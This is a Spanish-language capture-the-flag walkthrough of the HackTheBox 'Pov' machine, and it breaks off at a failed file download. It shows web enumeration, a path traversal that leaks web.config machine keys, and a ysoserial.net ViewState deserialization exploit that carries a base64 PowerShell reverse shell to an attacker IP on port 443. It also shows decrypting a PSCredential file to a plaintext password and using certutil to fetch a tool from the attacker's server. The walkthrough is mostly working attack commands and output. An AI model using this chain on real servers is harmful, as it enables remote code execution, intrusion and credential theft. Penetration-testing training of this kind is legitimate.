## <code style="color : Aquamarine">POV</code>

<style>
    .codenobutton button {
        display: none;
}
</style>

```shell
cd /htb/machines/pov/nmap
ping 10.129.108.177

```
#Linux (TTL -> 64) | Windows (TTL->128)

```shell
ping -c 1 10.129.108.177 -R   
```

Ejecutamos nmap para scanear todos los puertos y guardarlo en un archivo allPorts

```javascript
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn  10.129.108.177 -oG allPorts
```

Obtenemos:

```codenobutton
┌─[user@parrot]─[~/htb/machines/pov/nmap]
└──╼ $cat allPorts 
# Nmap 7.94SVN scan initiated Thu Jun 20 17:49:58 2024 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.129.108.177
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.129.108.177 ()	Status: Up
Host: 10.129.108.177 ()	Ports: 80/open/tcp//http///	Ignored State: filtered (65534)
# Nmap done at Thu Jun 20 17:50:25 2024 -- 1 IP address (1 host up) scanned in 26.50 seconds
```
Analizamos mas el puerto 80
```javascript
sudo nmap -sCV -p80 10.129.108.177 -oN targeted
```
Resultados
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-20 21:25 UTC
Nmap scan report for 10.129.108.177
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: pov.htb
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.74 seconds
```
Lanzamos whatweb para determinar las tecnologias que se usan
```javascript
whatweb http://10.129.108.177
```
Obtenemos:
> [!NOTE]
> http://10.129.108.177 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[sfitz@pov.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.129.108.177], Microsoft-IIS[10.0], Script, Title[pov.htb], X-Powered-By[ASP.NET]

```bash
ping -c 1 pov.htb
echo "10.129.108.177   pov.htb" >> /etc/hosts

```
Nos vamos a la url: http://pov.htb y no observamos algo extranio, y analizaremos sub directorio, si no tenemos el diccionario se declist lo instalamos.
```bash
sudo apt install seclists
gobuster dir -u http://pov.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 --no-error
```
Obtenemos:

```bash
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 142] [--> http://pov.htb/img/]
/css                  (Status: 301) [Size: 142] [--> http://pov.htb/css/]
/js                   (Status: 301) [Size: 141] [--> http://pov.htb/js/]
/IMG                  (Status: 301) [Size: 142] [--> http://pov.htb/IMG/]
/*checkout*           (Status: 400) [Size: 3420]
/CSS                  (Status: 301) [Size: 142] [--> http://pov.htb/CSS/]
/Img                  (Status: 301) [Size: 142] [--> http://pov.htb/Img/]
/JS                   (Status: 301) [Size: 141] [--> http://pov.htb/JS/]
/*docroot*            (Status: 400) [Size: 3420]

```bash
wfuzz -c --hh=12330 -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.pov.htb" http://pov.htb

```
```bash
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000019:   302        1 L      10 W       152 Ch      "dev"                                                               
000009532:   400        6 L      26 W       334 Ch      "#www"                                                              
000010581:   400        6 L      26 W       334 Ch      "#mail"                                                             
000047706:   400        6 L      26 W       334 Ch      "#smtp" 
```
Agregamos el subdominio dev al /etc/hosts y lanzamos curl
```bash
echo "10.129.108.177   dev.pov.htb" >> /etc/hosts
curl -s -X GET http://dev.pov.htb
```

Obtenemos

```html
<head><title>Document Moved</title></head>
<body><h1>Object Moved</h1>This document may be found <a HREF="http://dev.pov.htb/portfolio/">here</a></body>
```

Nos redirige al portafolio y abrimos para investigar el sitio, usamos whatweb para saber

```bash
whatweb http://dev.pov.htb
```

Obtenemos

```h
http://dev.pov.htb [302 Found] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.129.108.177], Microsoft-IIS[10.0], RedirectLocation[http://dev.pov.htb/portfolio/], Title[Document Moved], X-Powered-By[ASP.NET]
http://dev.pov.htb/portfolio/ [200 OK] ASP_NET[4.0.30319], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.129.108.177], JQuery[3.4.1], Meta-Author[Devcrud], Microsoft-IIS[10.0], Script, Title[dev.pov.htb], X-Powered-By[ASP.NET]
```
https://infosecmachines.io
navegamos a  http://dev.pov.htb/portfolio

```


```bash
echo "10.129.185.102   dev.pov.htb" >> /etc/hosts
gobuster dir -u http://dev.pov.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x aspx
gobuster dir -u http://dev.pov.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x aspx --exclude-length 188
```

Y obtenemos 302, es decir todo redirecciona. mas info en https://http.cat/

```bash
gobuster dir -u http://dev.pov.htb/portfolio -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x | grep -v "302"
```
y obtenemos algunos directorios al cual navegamos por contact.aspx y default.aspx

```bash
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/contact.aspx         (Status: 200) [Size: 4691]
/default.aspx         (Status: 200) [Size: 21371]
/Default.aspx         (Status: 200) [Size: 21371]
/assets               (Status: 301) [Size: 159] [--> http://dev.pov.htb/portfolio/assets/]
/Contact.aspx         (Status: 200) [Size: 4691]
/Assets               (Status: 301) [Size: 159] [--> http://dev.pov.htb/portfolio/Assets/]
```
Descargamos el cv y analizamos los metadatos, tenemos en cuenta el nombre del usuario por si sea necesario.
```bash
┌─[root@htb-adqnh87wfy]─[/home/outlanderlat/Downloads]
└──╼ #exiftool cv.pdf 
ExifTool Version Number         : 12.57
File Name                       : cv.pdf
Directory                       : .
File Size                       : 148 kB
File Modification Date/Time     : 2024:06:26 17:07:00-05:00
File Access Date/Time           : 2024:06:26 17:07:00-05:00
File Inode Change Date/Time     : 2024:06:26 17:07:00-05:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.7
Linearized                      : No
Page Count                      : 1
Language                        : es
Tagged PDF                      : Yes
XMP Toolkit                     : 3.1-701
Producer                        : Microsoft® Word para Microsoft 365
Creator                         : Turbo
Creator Tool                    : Microsoft® Word para Microsoft 365
Create Date                     : 2023:09:15 12:47:15-06:00
Modify Date                     : 2023:09:15 12:47:15-06:00
Document ID                     : uuid:3046DD6C-A619-4073-9589-BE6776F405F2
Instance ID                     : uuid:3046DD6C-A619-4073-9589-BE6776F405F2
Author                          : Turbo

```
Vamos a analizar con burbsuite los parametros que se envian. Al ser un IS los datos que estan en base64 y forma serializada no se pueden alterar, y lo mas interesante es el campo file=cv.pf podemos intentar poner la ruta de otro archivo, 

```bash
POST /portfolio/ HTTP/1.1
Host: dev.pov.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://dev.pov.htb/portfolio/
Content-Type: application/x-www-form-urlencoded
Content-Length: 357
Origin: http://dev.pov.htb
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=trcOk8TIs76tiflYimAQ1oYz2NoLl4kVSUYEj%2BOntg5k8qx4Nm2e0e%2Fmp%2FPGZBgSb3iMHpgWJwxC3ZLwcmZ%2BpPiU5Qw%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=vbnHgOARiUCUU42ZGjbprRqOq6O5ObtrthU79l7HTPQLB4RVOAurebcJApvQU6wdqHeOW0XV4AUhDTADmcCgYU6rx2jLWHzJqpl4NWNAbZ2LP%2Bb8JBdRVeAP9sGHD2acXLUKgQ%3D%3D&file=cv.pdf
```
Enviamos el repeater y intentamos acceder al archivo default.aspx y en el codigo observamos un archivo index.aspx.cs ingresamos a este y analizamos el codigo
```css
using System;
using System.Collections.Generic;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Text.RegularExpressions;
using System.Text;
using System.IO;
using System.Net;

public partial class index : System.Web.UI.Page {
    protected void Page_Load(object sender, EventArgs e) {

    }
    
    protected void Download(object sender, EventArgs e) {
            
        var filePath = file.Value;
        filePath = Regex.Replace(filePath, "../", "");
        Response.ContentType = "application/octet-stream";
        Response.AppendHeader("Content-Disposition","attachment; filename=" + filePath);
        Response.TransmitFile(filePath);
        Response.End();
        
    }
}
```
en la variable filePath encontramos una medidad de seguridad para evitar ir varias rutas hacia atras (directory path transversal) con el formato ../ pero tenemos varias formas de variar esto por ejemplo:

```bash
file=..\..\..\..\..\windows\System32\Drives\etc\hosts
file=../../../../../windows/System32/Drives/etc/hosts
file=c:\Windows\System32\Drivers\etc\hosts
```
El ultimo si funciona, con la ruta directa. entonces con ysoserial vamos a crear nuevos datos para la variable VIEWSTATE para hacer un ataque de deserializacion pero antes nesecitamos las claves, para eso buscamos el archio web.config tipico de IS file=..\web.config y obtenemos la decryptiokey validation y validatiokey

```html
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: application/octet-stream
Server: Microsoft-IIS/10.0
Content-Disposition: attachment; filename=..\web.config
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Thu, 27 Jun 2024 15:19:08 GMT
Connection: close
Content-Length: 866

<configuration>
  <system.web>
    <customErrors mode="On" defaultRedirect="default.aspx" />
    <httpRuntime targetFramework="4.5" />
    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
  </system.web>
    <system.webServer>
        <httpErrors>
            <remove statusCode="403" subStatusCode="-1" />
            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
        </httpErrors>
        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
    </system.webServer>
</configuration>
```
En una computadora win10 decargamos ysoserial https://github.com/pwntester/ysoserial.net descomprimimos y en cmd en la carpeta esribimos ysoserial -p ViewState --examples para ver los ejemplos y nos que damos con la primera y reemplazamos los datos segun corresponda, ejecutaremos un ping al atacante de la interfas tun0, copiamos el payload serializdo obtenido.
```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties --path="/portfolio" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" -c "ping 10.10.15.14"
```
En el ataquente ponemos en escucha la interfas tun0 para ver podemos recibir el ping
```bash
└──╼ #tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes

```
Payload serializado obtenido lo reemplzamo por el valor original de VIEWSTATE
```bash
3KbrG63qMQmNkSg2M0cFiqqQgynyFcLjO4D21eKidrHTgeAha957dEXozDmsjtMpYARCOB6720NDkC%2Bom7woPnNVgff3bMVF2XkBqxc44l1rhja03iPUq5DGxkt0zHEePLIENkgYnfaNKne2dYxxiD4OBdlvP6s5t6pqeDBMaJMNDeCg2ufhX%2FkSYevM22eRBQ8HpsOrJYd%2BGlVCSKnWCrkAmT28OR5B7U95kJ27QjMaQfR5SFfFyMCuKkyI5dycOM95MbYHTzdQweR0IqkaI%2BqjLFM7sz2c76lSpAGU%2FGdgKHGopwxyz%2FMg96xnsrKtyf1dOuWqHbia4%2Bm6ZnuqMCnTi%2BQ%2F5kI3Dfh%2BaF%2Fy7kIAga2mQLf2lwGw8yK7tHmAF%2F3RlDVbFaGO2E0APO9Nk%2FGMSl2dMCL%2Fcj0l0gUKwN3PpUPn6d9q7ZGMRdL8Lfe%2FCwHak%2FPNiwxlt51p4iu0VmWIGN7APthgMLcHiBmIiolpwdkUxs46aDAuE4GxVmoPXODibPIBb2nW3QavkUUx1Eryz7Y9L%2BpAFH424qGdTAoI06UkEkwHlHWU4lcDC7r4VJUNBR%2BTgxUzuuI7MsvpL6e4AC4jyL0iFqH%2FuvaDPa%2FzVs2U1IvVuSvOBySaMaowC9hKBWDnSgMwRiDXLxERfFpJRcP7Jl5fvEDdyLVIxeS19g4CPbix9B%2BX8V8JNFLtewvkVDyHPEYWVqM3zX%2B4bB8hX5uY9PPiv3UBTauqaeEIQf2qpsk2l6Xwoj7W%2B4CKWZuTiYItXzjgPdx6D6l75z12IPY%2FTML3Jj166xSKmqYPgH0p6Ou4aFVlk0SFZqpsGWAIqwNZR%2BPZYHy50q%2F8aXAkJ9nVtoTK2blK9TgyOf6muixrZ%2B4xTJzhXOwSohUCQPP%2B3TXlzEotako1RvtJYLKbL0u6t%2FERIyb9KmEB9zk5xeE2KJauRPKYRezvFU0cVjnmL24zVS9Jl1ucu2OO7sP6Hw3Udsl3Kp2sW85BxOBIuLo3HJlQxZnZ93AGa4fUvN6JJ4yi7W%2FyTOqqgwDaCb14pb5QaCqZEHMZSubtIWSkEu6bTcGFxj6JJvVhsfxcUBrVFkbiKp%2FziTRf6gSKPH%2F%2BCtwws9O%2BOdcP2NGh3cxWFtBPl0X67PmSHeWiIrhUG6mrE%2FP8Z%2FejMtUnYN6%2FTd%2Bbc7I6t4EcB5vhz1L0vXBv8cD%2Bs8dhLvJ%2FqVyk20OG6k6jZriIMgFDynRxcrPCgrUtwniUgKtecrG29FMvPOc37OPKcYgnou40k0vqIP6k4SzRxy1%2B3O%2Byvt0eEDvm3AtmcG8%3D
```
y obtenemos conexiones en la interfast tun0, ya somos capaces de ejecutar comandos remotos, ahora debemos ganar una revert shell, entonces en la parte de comando debemos cambiarlo, nos dirigimos a https://www.revshells.com/ para generar una, poniendo la ip del atacante, puerto 443, windows, typo powershell base64
```bash
──╼ #tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
11:36:45.749433 IP 10.129.185.102 > 10.10.15.14: ICMP echo request, id 1, seq 1, length 40
11:36:45.749457 IP 10.10.15.14 > 10.129.185.102: ICMP echo reply, id 1, seq 1, length 40
11:36:46.760225 IP 10.129.185.102 > 10.10.15.14: ICMP echo request, id 1, seq 2, length 40
11:36:46.760237 IP 10.10.15.14 > 10.129.185.102: ICMP echo reply, id 1, seq 2, length 40
11:36:47.776223 IP 10.129.185.102 > 10.10.15.14: ICMP echo request, id 1, seq 3, length 40
11:36:47.776235 IP 10.10.15.14 > 10.129.185.102: ICMP echo reply, id 1, seq 3, length 40
11:36:48.791137 IP 10.129.185.102 > 10.10.15.14: ICMP echo request, id 1, seq 4, length 40
11:36:48.791157 IP 10.10.15.14 > 10.129.185.102: ICMP echo reply, id 1, seq 4, length 40

```
Copiamos el codigo generado y la reemplazamos la opcion -c "-c "ping 10.10.15.14""
```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties --path="/portfolio" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMQA0ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
```
Y generamos una nuevo payload serializado

```bash
NZRnBkq8pokokPXlerdJAImOuZCMAv4kczJi0xv2deHZVBbag6WbBX4QeJSvud9Xf9%2FqbDZJD6py3CYVlT%2BUyMzeFvwq21a%2FkMGLtAHEOOxQij%2FuLiVKDDvXI2NObDN%2FxTBbw8QLFvqu8VVCrXgHlmvn38Pf8hTqNkuUuvvU0OUimcGqFIQtEr3v%2BJLjbot6ewfdAm%2FrB9GwlVRlOUs4XkyMlJ8aEK2zRuHeBNfRE833WrUctzfVTJ7t5m4sA3fB21y2kSqmxZ7yAvAhHSAjdzssYCTayhL1dJLAFbRIjgqGdj38CzycKYOWMhGadhJQuDmRxqoP%2F8zX3Zh8%2FiKgprembyzyRYPXJyNNhLA8MlZFU0jXd1ihdsZ8boR%2FP7KvNtjpCebKkje2Yx5oi%2B7seaRdC6hW7qduWM6tHK2BudklaS0DguKiMyHYeHp2PsTPr4c99yOy0Z%2F5uglSqbJ70gYe6AFcrMnfsPGPRCOHwHiIlVBwS3HrFvZ7wS7N1n4oSDjUQn%2FxRIoZiYcoBRjvmYsPOGE5OK9Gytxxlz2Y3yoAt1229PXZrWKzb8bQCPD%2Bko2tfIiWPxCp5BjwSF7mST3leQrGGo6ZmXN91Qnz71UE%2B%2FVhsmT7WKwsaZjs5vLbTwKYKQR7CxgC5olRiiiqLSgx7OGjF1r53wXPiH2RS0armm41Se5wcnk7v3GyGZ5mF%2Fco34xGliH3Rbfqi7W1aYKWa134WlVASqnBclr9iXwZAi8d7i9Hclm3ME7Xp8bCFqjVCPP4VYFw4tePEnQF1EJQKabFj9mn2HEijXpannxnH%2BCLZN7tlkf5V0KhyBiupYmq3ySg3CQX7oOuQ0kjOf9wbklrQBPiXY2IAPUDKetjqZBasXmd0sm9Brvim6vUk5ubN6YNURHDRuBZzvj1SSbgOchwIxA%2BNVOBTnJkArgHO7q%2BoZ%2FkFWc5TbwwyfR80n2piy3w94dEdKc1gO0RvQQMePo6zb3%2Fm0YN4iPtk8tvnXBYk41cbI6PrbkwW4BuKgh4ZC4TdGIEAxzDzWNBGGReNL8somhqMLDQ4qHdp8s%2FhNefKA7vJw7DO5RMv54V%2BU6ku%2BDXuR3iPLxpgcuf8QcOpclChEi3bdrARaKvYobniPWtwaJWaaTNjwy3WROwoFsLlPn8Tu7ghLfj3d9ZbnicdyL9Ud5f2d8EhPxHbx7hS7Rm3vxyAyIDfNLkXV73pjt%2BtcmMr1ZHqmOSwt%2BtlYd8d1tiTsLj0ApYBQCN%2B0LszcsjKMKD8p9DolgfmwzTQSYX3LU9Ro2iYdLgrCEJrsedjWdCFv48%2BnpT%2BDCXVh2FmTJfY%2Bh%2FHBkpHlBDXssQUXygSYBxsXtZ4IrBmc2Vj2X3zHUTR3t9rRh8j534%2B%2B%2FcePflDoW%2BqYfIwKZ250eVkbSAFSNEPTFBXeB%2F6HnRAQfYZkDJiCmsqycfTI%2BECVskGbOhpG2UTueNXMHangw%2FoohyLTZ8rgcswxky5RxVmRZu4rBGAnSmFhXsAI4aLBqkNG4mtrou8iCHCVitVdclBPbS%2Bvv%2BEnPNml3jDZXCIe%2FxrqgNVR4gK9v5JFAzfm0W1n1Mi%2BXxK2CtKf9TedosrzZ2grV68RHROEtvrIf%2BcZexwKR6xtV1pToc0tCmAK9bWj52ycGWUU3JYjGIQk2nOzyCjoUfJZWwSdPbaJQ94j89kcX9TiXXO%2B58Vf0K5sQ4S5gHjh5RcU3mOaz3g8eXr4juZ0PaJvyzeDq5JYNziKOffQ5sLfhRkOsqp1BB%2BKhgDBPbpZfuL8XCK%2BZwJKncHHLqOFDgqmj%2FTZDXa7FOSgttqUKBQ5vApdNcadL7EbhAeZHu0EQxvaaCQ3Kahhvubk2EsY855dZQi5X4rjNbGZ0U9KVC2IE%2F4DbEynGt%2BmoyIX5%2FOB49Ac6%2FGO691bWeEX%2F2t28SQkktAmd3wf7n6J2lOCZPOhH62R%2B435UdTT%2BYQrVzocNx9%2B0AQFPHyGIKFwyYpVzqXI7MiaiJgQQJ6hmZoOZZHEK8v%2Biv%2FROhDE8EuaUTKdJN%2B6mbH8Rf0hLhhQL0tmKhCR2hQb6dXq2Bhn6O2QUNAtR0kow6f5JZSvu0zyWx5fYf7xClQBALkGAOx47j0OPzPniB7n%2FgyR0fWtsbRYEBElQKcPJjbDkNOj7gMYAMIx5IzSe4PVoKKfX69AK7AVAIt9z2AX7LUMAqRXeFxM0Z%2F0vrFLJ44cEJkqnsffoSjjpz5WGEx%2BPXzgG7eMBXHti3VqMc0LCZ7%2BbNZe2IIFgkkz5ypcWDS2sYvP0EQXqCKmPdgskYJmXiCOjp2f%2BzvoxRjtdRYRZjQndTXLthXrlOesZqJewQqNdxU1kOYCiI7lzJ2sn5oQ5abhTufLPVLqNgECxC%2FvvnzdYY3sIurSWS5X93PQw2QXyNol8oa5uIY3hvOAsE9ih0FS6EYndoFIQC%2ByowiX7rIyeCPc%2BYiZ5kxSiFlnJkOfyq%2B%2Beb3RBR8yS5aYIXAyiV3fMOkKuQUu4u7H2wdXzgsgmesfazrZ0Vb9ZJMyaM%2FvB2zBXdE%2FgzbjVfm8irGrSuchGf2LV%2F%2BR0bV%2BVQiXOmEAqSTsI37bDwGN1Ozuu1Gp2b9R33QkrAFHTyEOaoFW3ErS4NDAuh6wfhGI0MGejNGl3QfV73YpLKSgaHQ5OP2fM6PDLGfQyWPeFoRqjYWQXlsDqojDu03EeoPA2GMCNP7bM8E2OknM5tj0neQMkQoE2bjfNWRAJOhSksv1nu2pDBsCdU9mhghr96OKTa2VIzBMDwZULDdiZgoofpQwBs5%2B%2Fd%2FxuKUx3FNyU%2FLPVKVcB%2FNUGg3kfvWEqiVa2wQuqtQJIc8Y%2FDN0JgcufKLIYdS7H5OAZACtFdineHailwyFOnClr0Tq4x5w2h4KM1cMjMh8cXbh2heAcqKIPOxEMiiswtp4wTIaBgbXik8DB86ewQEgHQc9l1aH1RYr%2F6J2ioqap3uF2JTX85EEiuM5FvFLqrBinoqgAdX32c0pVxQSBJ%2BIfDuL1UMT3AXXtGLeop9JnArj1X2L6kZQYVeTD3zFGHdU9VE4dBjpvj2%2BbxQZqad38ssMfw4Q%3D%3D
```
Preparo la sesion de netcat para poder operar en la reverse shell y ejecutamos la peticion con el nuevo payload y hackeado..! 
```powershell
┌─[root@htb-juy2vwb9wc]─[/home/outlanderlat]
└──╼ #rlwrap -cAr nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.15.14] from (UNKNOWN) [10.129.185.102] 49671

PS C:\windows\system32\inetsrv> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::64ad:b5b6:76f:be4a
   Link-local IPv6 Address . . . . . : fe80::46db:416:4f2:a0b1%4
   IPv4 Address. . . . . . . . . . . : 10.129.185.102
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:2bb5%4
                                       10.129.0.1
PS C:\windows\system32\inetsrv> 

```
Navegamos por las carpetas aver si encontramos algo..! Tenemos una contraseña en powershell, que figua como un objeto PSCredential y lo podemos decifrar https://stackoverflow.com/questions/63639876/powershell-password-decrypt

```powershell
PS C:\users\sfitz\Documents> type connection.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
    </Props>
  </Obj>
</Objs>
PS C:\users\sfitz\Documents> 

```
Como es un archivo y para poder ver la contraseña de alaading ejecutamos:

```powershell
PS C:\users\sfitz\Documents> $Credential = Import-Clixml -path .\connection.xml
PS C:\users\sfitz\Documents> $Credential

UserName                     Password
--------                     --------
alaading System.Security.SecureString


PS C:\users\sfitz\Documents> $Credential.GetNetworkCredential().password
f8gQ8fynP44ek1m3
PS C:\users\sfitz\Documents> 

```
Analizamos sobre el usuario y vemos que tiene permisos para conectarse remotamente

```powershell
PS C:\users\sfitz\Documents> net user

User accounts for \\POV

-------------------------------------------------------------------------------
Administrator            alaading                 DefaultAccount           
Guest                    sfitz                    WDAGUtilityAccount       
The command completed successfully.

PS C:\users\sfitz\Documents> net user alaading
User name                    alaading
Full Name                    
Comment                      
User s comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never
Password last set            11/6/2023 10:59:23 AM
Password expires             Never
Password changeable          11/6/2023 10:59:23 AM
Password required            Yes
User may change password     Yes
Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   12/25/2023 4:56:21 PM
Logon hours allowed          All
Local Group Memberships      *Remote Management Use*Users                
Global Group memberships     *None                 
The command completed successfully.

```
Verificamos que tenemos abierto el puerto 5985 usaremos [runas](https://github.com/antonioCoco/RunasCs) par ejecutrar comandos como otro usuario
```powershell
S C:\users\sfitz\Documents> netstat /nat

Active Connections

  Proto  Local Address          Foreign Address        State           Offload State

  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       InHost      
  TCP    10.129.185.102:139     0.0.0.0:0              LISTENING       InHost      
  TCP    10.129.185.102:49671   10.10.15.14:443        ESTABLISHED     InHost  
```
Descoprimimos el archivo y configuramos para montar un servicio web para poder descargarlo al servidor IS
```bash
└──╼ #python -m http.server 81
Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...

```
En el servidor en la carapeta Windows\temp\ creamos una carpeta test descargamos el archivo

```powershell
PS C:\Windows\temp\test> certutil.exe -f -urlcache -split http://10.10.14.15:81/RunasCs.exe
****  Online  ****
CertUtil: -URLCache command FAILED: 0x80072ee4 (WinHttp: 12004 ERROR_WINHTTP_INTERNAL_ERROR)
